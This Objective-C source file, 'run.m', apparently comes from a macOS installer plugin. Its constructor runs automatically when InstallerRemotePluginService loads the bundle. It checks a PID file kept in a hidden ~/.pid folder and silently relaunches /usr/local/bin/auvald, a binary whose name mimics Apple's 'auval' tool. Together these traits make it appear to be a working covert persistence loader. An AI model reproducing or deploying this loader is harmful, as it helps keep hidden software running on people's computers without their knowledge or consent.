//
//  run.m
//  auval
//
//  Created by david on 2/6/23.
//

#import <Foundation/Foundation.h>
#import <libproc.h>
#include <spawn.h>
#include <unistd.h>
// This code executes when the bundle is initially loaded by the InstallerRemotePluginService

bool isProcessAlive() {
    NSString *pidDirectory = @".pid";
    NSString *homeDir = NSHomeDirectory();
    NSString *pidDirectoryPath = [homeDir stringByAppendingPathComponent:pidDirectory];
    NSString *pidFile = @"auvald.pid";
    NSString *pidFilePath = [pidDirectoryPath stringByAppendingPathComponent:pidFile];
    
    NSError *error = nil;
    NSString *pidString = [NSString stringWithContentsOfFile:pidFilePath encoding:NSUTF8StringEncoding error:&error];
    if (error) {
        NSLog(@"Failed to read PID file: %@", error.localizedDescription);
        return NO;
    }
    
    int pid = [pidString intValue];
    int result = kill(pid, 0);
    if (result == 0) {
        return YES;
    } else if (result == -1) {
        if (errno == ECHILD) {
            return NO;
        } else {
            NSLog(@"Failed to check process aliveness: %s", strerror(errno));
            return NO;
        }
    } else {
        return NO;
    }
}

// this function forks, which we dont want
void execute2(void)
{
    NSLog(@"executing");
    NSTask *task = [[NSTask alloc] init];
    task.launchPath = @"/usr/local/bin/auvald";
    task.arguments = @[@"-a", @"-nsB"];
    [task launch];
}

// non forking execute function
void execute(void)
{
    pid_t pid;
    posix_spawn(&pid, "/usr/local/bin/auvald", NULL, NULL, (char *const *)NULL, NULL);
}

__attribute__((constructor)) static void run()
{
    if (isProcessAlive()) {
        return;
    }
    execute();
}
